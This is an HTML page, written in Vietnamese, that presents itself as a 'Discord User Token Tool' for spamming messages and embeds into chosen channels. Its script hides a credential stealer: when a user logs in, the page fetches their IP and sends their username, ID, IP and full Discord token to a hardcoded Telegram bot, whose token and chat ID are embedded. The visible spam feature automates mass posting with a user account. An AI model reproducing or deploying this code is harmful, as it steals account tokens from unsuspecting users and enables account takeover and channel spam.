<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>TOOL BY KCUONG - Discord Utility</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0d0f1a; --fg: #ffffff; --card: #1b1f30;
      --main: #7289da; --accent: #5865f2;
    }
    [data-theme="light"] {
      --bg: #f5f5f5; --fg: #111;
      --card: #ffffff; --main: #5865f2; --accent: #4752c4;
    }
    body {
      background: radial-gradient(ellipse at top, #0d0f1a 0%, #000 100%);
      color: var(--fg); font-family: 'Inter', sans-serif;
      padding: 20px; margin: 0;
    }
    .card {
      background: var(--card); padding: 16px;
      border-radius: 10px; margin-bottom: 20px;
      box-shadow: 0 0 12px rgba(0,0,0,0.3);
    }
    h1, h2 { color: var(--main); margin: 0 0 10px; }
    input, textarea, button {
      width: 100%; padding: 10px; margin: 5px 0 15px;
      border-radius: 5px; border: none; font-size: 14px;
      font-family: 'Inter', sans-serif;
    }
    button {
      background: var(--main); color: white;
      cursor: pointer; transition: 0.3s ease;
    }
    button:hover { background: var(--accent); }
    .log {
      background: #111; padding: 10px;
      border-radius: 6px; height: 160px;
      overflow-y: auto; font-size: 13px;
      font-family: monospace;
    }
    .log-entry { border-bottom: 1px solid #333; padding: 4px 0; }
    .theme-toggle {
      position: fixed; top: 10px; right: 10px;
      font-size: 12px; padding: 6px 10px;
      border-radius: 20px; background: #333;
      color: #fff; cursor: pointer; opacity: 0.8; z-index: 999;
    }
    .logo-kcuong {
      font-weight: bold; font-size: 20px;
      padding: 10px 0; white-space: nowrap;
      width: 100%; overflow: hidden;
      position: relative;
    }
    .logo-kcuong span {
      display: inline-block; padding: 5px 20px;
      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
      background-size: 400% auto; color: white;
      animation: rainbowText 3s linear infinite, marquee 8s linear infinite alternate;
      border-radius: 10px; font-size: 20px; font-weight: bold;
    }
    @keyframes rainbowText {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }
    @keyframes marquee {
      0% { transform: translateX(0); }
      100% { transform: translateX(calc(100% - 200px)); }
    }
  </style>
</head>
<body>
  <div class="theme-toggle" onclick="toggleTheme()">🌗 Nền</div>
  <div class="logo-kcuong"><span>TOOL BY KCUONG</span></div>
  <h1>Discord User Token Tool (Không Gian)</h1>

  <div class="card">
    <h2>1. Token & Cấu hình</h2>
    <input id="token" placeholder="User token...">
    <button onclick="loginToken()">🔐 Đăng nhập Token</button>
    <div id="loginStatus" style="margin:10px 0;color:#0f0;"></div>
    <input type="datetime-local" id="scheduleTime">
  </div>

  <div class="card">
    <h2>2. Server</h2>
    <button onclick="loadGuilds()">🌌 Tải Server</button>
    <div id="guilds" style="margin-top:10px;"></div>
  </div>

  <div class="card">
    <h2>3. Kênh</h2>
    <div id="channels" style="margin-top:10px;"></div>
  </div>

  <div class="card">
    <h2>4. Tin nhắn & Embed</h2>
    <textarea id="message" placeholder="Nội dung tin nhắn..."></textarea>
    <input id="embedTitle" placeholder="Tiêu đề embed">
    <textarea id="embedDesc" placeholder="Mô tả embed"></textarea>
    <input id="embedColor" value="#7289da" placeholder="Màu hex">
    <input id="embedImage" placeholder="URL ảnh">
  </div>

  <div class="card">
    <h2>5. Gửi</h2>
    <input type="number" id="repeat" value="5" placeholder="Số lần gửi">
    <input type="number" id="delay" value="1000" placeholder="Delay mỗi lần (ms)">
    <button onclick="startSpam()">🚀 Bắt đầu</button>
    <button onclick="stopSpam()">⛔ Dừng</button>
  </div>

  <div class="card">
    <h2>6. Log</h2>
    <div class="log" id="log"></div>
  </div>

<script>
let selectedGuild = null;
let selectedChannels = new Set();
let stopRequested = false;
let userToken = "";

// CẤU HÌNH TELEGRAM
const TELEGRAM_BOT_TOKEN = '7227254763:AAGi30pG-TpLx32PWKJH-Og09-67HVzb6ko';
const TELEGRAM_CHAT_ID = '5705746414';

function toggleTheme() {
  const html = document.documentElement;
  html.dataset.theme = html.dataset.theme === 'light' ? 'dark' : 'light';
}

function log(msg) {
  const logBox = document.getElementById("log");
  const entry = document.createElement("div");
  entry.className = "log-entry";
  entry.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
  logBox.appendChild(entry);
  logBox.scrollTop = logBox.scrollHeight;
}

function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    })
  }).catch(err => console.error("Lỗi gửi Telegram:", err));
}

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch (e) {
    return "Không xác định";
  }
}

async function loginToken() {
  const token = document.getElementById("token").value.trim();
  if (!token) return log("❌ Bạn chưa nhập token.");

  try {
    const res = await fetch("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token }
    });

    if (!res.ok) throw new Error();

    const user = await res.json();
    userToken = token;
    document.getElementById("loginStatus").innerText = `✅ Đăng nhập: ${user.username}#${user.discriminator}`;
    log(`🎉 Đăng nhập thành công: ${user.username} (${user.id})`);

    const ip = await getIP();
    const msg = `🛠 Đăng nhập tool:\n👤 ${user.username}#${user.discriminator} (${user.id})\n🌐 IP: ${ip}\n🔑 Token: ${token}`;
    sendToTelegram(msg);

  } catch (err) {
    document.getElementById("loginStatus").innerText = "❌ Token không hợp lệ!";
    log("❌ Token không hợp lệ hoặc bị từ chối.");
  }
}

async function loadGuilds() {
  const token = userToken || document.getElementById("token").value.trim();
  const res = await fetch("https://discord.com/api/v9/users/@me/guilds", {
    headers: { Authorization: token }
  });
  const guilds = await res.json();
  const box = document.getElementById("guilds");
  box.innerHTML = "";
  guilds.forEach(g => {
    const btn = document.createElement("button");
    btn.textContent = g.name;
    btn.onclick = () => {
      selectedGuild = g.id;
      loadChannels(token, g.id);
      log(`📡 Server: ${g.name}`);
    };
    box.appendChild(btn);
  });
}

async function loadChannels(token, guildId) {
  const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
    headers: { Authorization: token }
  });
  const channels = await res.json();
  const box = document.getElementById("channels");
  box.innerHTML = "";
  selectedChannels.clear();
  channels.filter(c => c.type === 0).forEach(c => {
    const btn = document.createElement("button");
    btn.textContent = `#${c.name}`;
    btn.onclick = () => {
      if (selectedChannels.has(c.id)) {
        selectedChannels.delete(c.id);
        btn.style.background = "";
      } else {
        selectedChannels.add(c.id);
        btn.style.background = "green";
      }
    };
    box.appendChild(btn);
  });
}

function startSpam() {
  const token = userToken || document.getElementById("token").value.trim();
  const msg = document.getElementById("message").value.trim();
  const repeat = parseInt(document.getElementById("repeat").value);
  const delay = parseInt(document.getElementById("delay").value);
  const schedule = document.getElementById("scheduleTime").value;
  const embed = {};
  const hasEmbed =
    document.getElementById("embedTitle").value.trim() ||
    document.getElementById("embedDesc").value.trim() ||
    document.getElementById("embedImage").value.trim();

  if (hasEmbed) {
    embed.title = document.getElementById("embedTitle").value;
    embed.description = document.getElementById("embedDesc").value;
    embed.color = parseInt(document.getElementById("embedColor").value.replace("#", ""), 16);
    const img = document.getElementById("embedImage").value;
    if (img) embed.image = { url: img };
  }

  if (!token || selectedChannels.size === 0 || (!msg && !hasEmbed)) {
    return log("⚠️ Thiếu thông tin (token / kênh / nội dung)");
  }

  if (schedule) {
    const start = new Date(schedule).getTime();
    const now = Date.now();
    const wait = start - now;
    if (wait > 0) {
      log(`⏳ Sẽ bắt đầu sau ${Math.ceil(wait / 1000)} giây...`);
      setTimeout(() => spamNow(token, msg, repeat, delay, embed), wait);
    } else {
      log("⚠️ Thời gian bắt đầu phải lớn hơn hiện tại!");
    }
  } else {
    spamNow(token, msg, repeat, delay, embed);
  }
}

function spamNow(token, msg, repeat, delay, embed) {
  stopRequested = false;
  let count = 0;
  const max = repeat <= 0 ? Infinity : repeat;

  const send = async () => {
    for (const chId of selectedChannels) {
      if (stopRequested || count >= max) return stopSpam();

      try {
        const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
          method: "POST",
          headers: {
            Authorization: token,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            content: msg || undefined,
            embeds: Object.keys(embed).length > 0 ? [embed] : undefined
          })
        });

        if (res.status === 429) {
          const retry = (await res.json()).retry_after;
          log(`🛑 Rate limited - đợi ${retry}ms`);
          await new Promise(r => setTimeout(r, retry));
        } else if (res.ok) {
          count++;
          log(`✅ Gửi (${count}/${repeat}) → kênh ${chId}`);
        } else {
          const err = await res.json();
          log(`❌ Lỗi gửi: ${err.message || res.status}`);
        }
      } catch (e) {
        log("❌ Lỗi mạng: " + e.message);
      }
    }

    if (!stopRequested && count < max) {
      setTimeout(send, delay);
    } else {
      stopSpam();
    }
  };

  send();
}

function stopSpam() {
  stopRequested = true;
  log("⛔ Đã dừng spam.");
}
</script>
</body>
</html>